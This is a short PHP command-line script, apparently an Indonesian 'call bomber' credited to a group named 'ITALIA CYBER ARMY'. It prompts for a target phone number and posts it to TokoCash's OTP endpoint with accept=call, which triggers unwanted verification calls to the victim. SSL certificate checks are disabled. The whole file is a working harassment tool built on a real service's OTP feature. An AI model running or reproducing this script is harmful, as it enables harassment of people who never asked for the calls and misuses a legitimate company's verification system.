<?php
// Limit 3x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "\e[1;92mCreated by ; ERR0R\n\n";
echo "Team ; ITALIA CYBER ARMY\n\n";
echo "NOTE! Limit 3× telpon setiap 1 nomor\n\n";
echo "Nomor target\nMasukin nomornya (ex;08xxx) : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
